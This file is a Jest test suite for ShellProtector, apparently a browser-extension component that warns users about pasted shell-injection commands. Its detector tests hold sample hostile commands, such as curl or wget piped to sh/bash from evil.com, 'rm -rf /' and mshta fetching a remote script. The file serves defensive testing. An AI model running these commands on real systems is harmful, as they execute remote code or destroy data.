import { ShellProtector } from '../content-shell';
import { displayShellInjectionNotification } from '../content-notifications.js';


jest.mock('../content-notifications.js');

const mockDisplayShellInjectionNotification = displayShellInjectionNotification as jest.MockedFunction<typeof displayShellInjectionNotification>;

// Mock console methods to avoid test output noise
const consoleSpy = {
  debug: jest.spyOn(console, 'debug').mockImplementation(),
  warn: jest.spyOn(console, 'warn').mockImplementation(),
  error: jest.spyOn(console, 'error').mockImplementation()
};

describe('ShellProtector', () => {
  beforeEach(() => {
    jest.clearAllMocks();
    
    // Reset static properties
    (ShellProtector as any).isActive = true;
    (ShellProtector as any).clipboardPermissionCache = null;
    
    // Mock window.location
    Object.defineProperty(window, 'location', {
      value: { href: 'https://example.com/test' },
      writable: true,
      configurable: true
    });
    
    // mockUrlHost.mockReturnValue('example.com');
    
    // Mock document methods
    Object.defineProperty(document, 'execCommand', {
      value: jest.fn().mockReturnValue(true),
      writable: true
    });
    
    Object.defineProperty(document, 'getElementById', {
      value: jest.fn(),
      writable: true
    });
    
    Object.defineProperty(document, 'addEventListener', {
      value: jest.fn(),
      writable: true
    });
    
    Object.defineProperty(document, 'createElement', {
      value: jest.fn(),
      writable: true
    });
    
    // Mock document.body
    Object.defineProperty(document, 'body', {
      value: {
        appendChild: jest.fn(),
        removeChild: jest.fn()
      },
      writable: true
    });

   
  });

  afterEach(() => {
    Object.values(consoleSpy).forEach(spy => spy.mockClear());
  });

  describe('attachEvents', () => {
    it('should attach click events to disable warning buttons', () => {
      const mockButton1 = { addEventListener: jest.fn() };
      const mockButton2 = { addEventListener: jest.fn() };
      const mockDocument = {
        getElementById: jest.fn()
          .mockReturnValueOnce(mockButton1)
          .mockReturnValueOnce(mockButton2)
      };

      ShellProtector.attachEvents(mockDocument as any);

      expect(mockDocument.getElementById).toHaveBeenCalledWith("mb-disable-shell-warning");
      expect(mockDocument.getElementById).toHaveBeenCalledWith("mb-disable-search-hijacking-warning");
      expect(mockButton1.addEventListener).toHaveBeenCalledWith("click", expect.any(Function));
      expect(mockButton2.addEventListener).toHaveBeenCalledWith("click", expect.any(Function));
    });

    it('should handle missing buttons gracefully', () => {
      const mockDocument = {
        getElementById: jest.fn().mockReturnValue(null)
      };

      expect(() => ShellProtector.attachEvents(mockDocument as any)).not.toThrow();
    });

  });

  describe('isSuspiciousText', () => {
    it('should detect command chaining with semicolon', () => {
      expect(ShellProtector.isSuspiciousText('ls -la; rm -rf /')).toBe(true);
    });

    it('should detect pipe commands', () => {
      expect(ShellProtector.isSuspiciousText('curl http://evil.com/script.sh | sh')).toBe(true);
      expect(ShellProtector.isSuspiciousText('wget -O- http://malware.com | bash')).toBe(true);
    });

    it('should detect command substitution', () => {
      expect(ShellProtector.isSuspiciousText('$(ls -la)')).toBe(true);
    });

    it('should detect suspicious shell keywords', () => {
      expect(ShellProtector.isSuspiciousText('curl http://example.com')).toBe(true);
      expect(ShellProtector.isSuspiciousText('rm -rf /important/files')).toBe(true);
      expect(ShellProtector.isSuspiciousText('wget malicious-file.exe')).toBe(true);
      expect(ShellProtector.isSuspiciousText('mshta http://evil.com/script.hta')).toBe(true);
    });

    it('should detect Windows cmd patterns', () => {
      expect(ShellProtector.isSuspiciousText('cmd /c start powershell')).toBe(true);
      expect(ShellProtector.isSuspiciousText('cmd /c start /min powershell')).toBe(true);
    });

    it('should return false for safe text', () => {
      expect(ShellProtector.isSuspiciousText('Hello world')).toBe(false);
      expect(ShellProtector.isSuspiciousText('This is normal text')).toBe(false);
      expect(ShellProtector.isSuspiciousText('user@example.com')).toBe(false);
      expect(ShellProtector.isSuspiciousText("no it's Becky")).toBe(false);
      expect(ShellProtector.isSuspiciousText('Eeemotionaaal Damaage')).toBe(false);
      expect(ShellProtector.isSuspiciousText("Look at me, I'm the captain now")).toBe(false);
    });
  });

  describe('getClipboardContent', () => {
    beforeEach(() => {
      // Reset navigator.clipboard for each test
      Object.defineProperty(navigator, 'clipboard', {
        value: undefined,
        writable: true,
        configurable: true
      });
    });

    it('should return text from clipboard event data', async () => {
      const mockEvent = {
        clipboardData: {
          getData: jest.fn().mockReturnValue('test clipboard text')
        }
      } as unknown as ClipboardEvent;

      const result = await ShellProtector.getClipboardContent(mockEvent);
      expect(result).toBe('test clipboard text');
    });
  });

  describe('setClipboardContent', () => {
    beforeEach(() => {
      Object.defineProperty(navigator, 'clipboard', {
        value: undefined,
        writable: true,
        configurable: true
      });
    });

    it('should use navigator.clipboard.writeText successfully', async () => {
      Object.defineProperty(navigator, 'clipboard', {
        value: {
          writeText: jest.fn().mockResolvedValue(undefined)
        },
        writable: true,
        configurable: true
      });

      const result = await ShellProtector.setClipboardContent('test text');
      expect(result).toBe(true);
      expect(navigator.clipboard.writeText).toHaveBeenCalledWith('test text');
    });

    it('should fallback to execCommand when clipboard API fails', async () => {
      Object.defineProperty(navigator, 'clipboard', {
        value: {
          writeText: jest.fn().mockRejectedValue(new Error('Permission denied'))
        },
        writable: true,
        configurable: true
      });

      const mockTextarea = {
        value: '',
        style: {} as CSSStyleDeclaration,
        setAttribute: jest.fn(),
        select: jest.fn()
      };
      
      (document.createElement as jest.Mock).mockReturnValue(mockTextarea);
      (document.execCommand as jest.Mock).mockReturnValue(true);

      const result = await ShellProtector.setClipboardContent('test text');
      
      expect(result).toBe(true);
      expect(mockTextarea.value).toBe('test text');
      expect(mockTextarea.select).toHaveBeenCalled();
      expect(document.execCommand).toHaveBeenCalledWith('copy');
    });

    it('should return false when all methods fail', async () => {
      Object.defineProperty(navigator, 'clipboard', {
        value: {
          writeText: jest.fn().mockRejectedValue(new Error('Permission denied'))
        },
        writable: true,
        configurable: true
      });

      (document.execCommand as jest.Mock).mockReturnValue(false);

      const result = await ShellProtector.setClipboardContent('test text');
      expect(result).toBe(false);
    });
  });

  describe('injectWarning', () => {
    it('should call displayShellInjectionNotification with attachEvents', () => {
      ShellProtector.injectWarning();
      expect(mockDisplayShellInjectionNotification).toHaveBeenCalledWith(ShellProtector.attachEvents);
    });
  });
});
